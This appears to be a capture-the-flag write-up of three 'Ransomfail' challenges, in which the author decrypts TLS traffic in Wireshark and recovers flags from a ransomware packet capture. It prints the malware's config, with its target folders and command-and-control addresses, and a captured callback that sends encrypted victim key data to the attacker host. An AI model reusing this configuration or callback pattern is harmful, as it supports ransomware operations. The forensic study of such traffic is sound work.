# Ransomfail challenges

## Ransomfail1

Task:
```
A machine in our network has been hit by ransomware. Our security team has collected a forensics package consisting\
of the encrypted files, the powershell console log, and a packet capture showing the traffic going between the infected\
 achine and the adversaries’ infrastructure. Additionally, our offsec team has retrived one of the private keys used\
 for the TSL connection and a python script to encrypt files on the adversaries’ infrastructure.

First objective is to locate the flag that was requested by the ransomware operator before downloading its payload.\
Find it in the packet capture. 
```


Provided files:
- traffic.pcap
- Endpoint_Triage.zip (not included in this repo)
- offline-encryptor.py
- key.pem


To wireshark!\
Open the pcap, put in the .pem file:
- find a tls-packet, packet #4
- right-click the TLS line in the packet details -> Protocol Preferences -> RSA Key list, enter .pem
- Edit -> Preference -> Protocols -> TCP -> Enable reassemble out-of-order segments
- Follow tls-stream

Et voila: `EPT{protect-y0ur-keys}`

## Ransomfail2

Task: 
```
You must solve the previous Ransomfail challenge in order to solve this challenge.

A flag is bundled with the downloaded payload within the pcap. Find it.

Use the files provided in Ransomfail1.
```

Packet 22 - follow tls\
inline filename= payload.zip\
At the bottom of the wireshark window: `EPT{unzip-4ll-th3-things}`\
It might be the plaintext contents of flag2.txt 😇

There is a lot of PK, so I need to extract the file.

## Ransomfail3 (incomplete)
Task: 
```
You must solve the previous Ransomfail challenge in order to solve this challenge.

A flag is hidden within the malware. Find it.

Use the files provided in Ransomfail1.
```

ransomfail2 challenge showed a payload.zip file, however getting it out of wireshark was not as straight forward as I\
thought/would like. At way too late(including falling back from DST) some copy/pasting from wireshark into cyberchef\
and the extract files provided a functioning zipfile.\
The file payload.zip seems to contain, at least:
- flag2.txt
- config.config
- encryptor.exe



Content of config.config:
````
encrypt_folders=Documents,Downloads
homeaddr=https://20.93.1.11:8443
offline_encryptor=https://20.93.1.11:9443
pubkey=21847732758634593029416240002478875383973080855716809434866109082382489701155326450353994368776770641447716003980386530355340076184610870630810137291035467733215553611058685684143470287772384633746034978807210628931881796742192855387390013890787778271916205532415863438557565646661583047208513372160977375367361498115348160156610003956800274181305780393902549530703305304223259928302121979102189768512466646506960407976349259697993752398337400709303988647652591986625827434663893431898326524073973917110456157918324997081687338993314231676340887393541075983361310015084862158246234194743678926725583762034224588755699
e=65537
````

tcp.stream3 contains a base64 encoded string that is /POST'ed with the result ["success":true]
```
POST /callback HTTP/1.1
Host: 20.93.1.11:8443
Content-Type: application/x-www-form-urlencoded
Content-Length: 1311

report=aG9zdD1yYW5zb21mYWlsLXZpY3QKa2V5PVpsTnA1c3FPTEZKM0hxSzNyeGJmdjJkdEJPT20va1VNaDhUK0dUSGlTQW1ydWdRRHlCMFZQWm9TU0Q2d1lPMXp5ZHhRbXdOY2ZTOWdnK2drSnI3S05DRU4rTGlKZ3g3ZHNHWVk4TG0wTnczRW1WWXFxcEVGNWszTTZZS3ZqdmpFTEcyRldabWttZ25VMnRoTVV1V1B0eFZOQkVuTjdrZzFBQU55aytDZ0dqRXlBcHNCaUh4UEd4c0JGQ1lORTV6RmpuNThlaVY4dDZJbFNQZWN2OVU2Qnl1TWExSUs5QVlBS3NiQTVFQkRaWjhLVkkxeDY5Wk5FamlGMlduM01aOWoxYzh3K25BSFJYdWRoOVdvN2hNVFVBbmZiNSthKzZEWUxkVTM0aklZczFsVXRUZlFKOHlkaTV1czJWQStzNWxWQWhJYUtybXJtcCtRcXphV280SDU5dz09Cml2PXJJRm5wQnoyV0o2RGJhUmR2R2JuLzJYeHNYY1hERDZsbmNxcVJKTGFBdzZCcjV6Si80ak1PczlPTVZGem1ndEhtZ3N5ejEvWURSc1RWYUx0QlNhS04zQWJ4V2drc0ZFeks3TVF2ZTFEYzRiYmVydGNBVk9RMHJBZjdtK3FSbUl5enVrMnBUemlEbFExNDlGZXQ5ZjdLUG8wdHdwTVl6R2IzZWFUaWxxSllqSk5mY2h3bUljM0lIMzVqdXJPclRzajl3akRkMnVVWXlrSTVzTElCSDVFNktZRTZzbnBHYjNmT3hwZlhFSkxyTmhwUFd1dzhFL09VRkZob1daMDhTMWgvSk02NVVVY1lEb1Rvc1Vud08zUFNuRDczWVl0bW9SODZNdVpKbmJMRjU3MDJDMEdrQm1EWjNZSGZ2Q1dsUHhwY291NUpGc1N6a1Y2TGkyTEJSRHZnUT09CnBheWxvYWQ9aE5GbVIwTTU4WTdJTkJNN3JyS245QU1BYVNJQ1dPMzZwOGhPekhDK3N4bnR2YU9DRy9nNW8zWDNkRzZSTXpKMzkrV2NIMi9RSjNPcXVnemx2bWZ6RVlGeEtJbHI2b2JNZ210RDE4aER5Ry9hazJnTU5DUncrYlMzTWRaVmhsNkJIN3YwRGVXZVJCYldMRXR2ZkZGUXBBPT0KZmxhZzM9L3BTUFV0TGoxY2d4V2pob0IzUmwyRFJXblIzVGFDUUtvTm40T3dVMjlTemV1TXFqRmFwNU1CTDZjcDRVUEJEd1I3RmtCcTcvMWJCSXU2NHJjUjMyUWc9PQ%3D%3DHTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Wed, 27 Oct 2021 21:06:59 GMT
Connection: close
Content-Type: application/json
Content-Length: 17

{"success":true}
```

Decoded it reads:
```
host=ransomfail-vict
key=ZlNp5sqOLFJ3HqK3rxbfv2dtBOOm/kUMh8T+GTHiSAmrugQDyB0VPZoSSD6wYO1zydxQmwNcfS9gg+gkJr7KNCEN+LiJgx7dsGYY8Lm0Nw3EmVYqqpEF5k3M6YKvjvjELG2FWZmkmgnU2thMUuWPtxVNBEnN7kg1AANyk+CgGjEyApsBiHxPGxsBFCYNE5zFjn58eiV8t6IlSPecv9U6ByuMa1IK9AYAKsbA5EBDZZ8KVI1x69ZNEjiF2Wn3MZ9j1c8w+nAHRXudh9Wo7hMTUAnfb5+a+6DYLdU34jIYs1lUtTfQJ8ydi5us2VA+s5lVAhIaKrmrmp+QqzaWo4H59w==
iv=rIFnpBz2WJ6DbaRdvGbn/2XxsXcXDD6lncqqRJLaAw6Br5zJ/4jMOs9OMVFzmgtHmgsyz1/YDRsTVaLtBSaKN3AbxWgksFEzK7MQve1Dc4bbertcAVOQ0rAf7m+qRmIyzuk2pTziDlQ149Fet9f7KPo0twpMYzGb3eaTilqJYjJNfchwmIc3IH35jurOrTsj9wjDd2uUYykI5sLIBH5E6KYE6snpGb3fOxpfXEJLrNhpPWuw8E/OUFFhoWZ08S1h/JM65UUcYDoTosUnwO3PSnD73YYtmoR86MuZJnbLF5702C0GkBmDZ3YHfvCWlPxpcou5JFsSzkV6Li2LBRDvgQ==
payload=hNFmR0M58Y7INBM7rrKn9AMAaSICWO36p8hOzHC+sxntvaOCG/g5o3X3dG6RMzJ39+WcH2/QJ3OqugzlvmfzEYFxKIlr6obMgmtD18hDyG/ak2gMNCRw+bS3MdZVhl6BH7v0DeWeRBbWLEtvfFFQpA==
flag3=/pSPUtLj1cgxWjhoB3Rl2DRWnR3TaCQKoNn4OwU29SzeuMqjFap5MBL6cp4UPBDwR7FkBq7/1bBIu64rcR32Qg==
```

And that's where the rabbithole, and CTF ended.\
Or in norwegian: Snipp, snapp snute...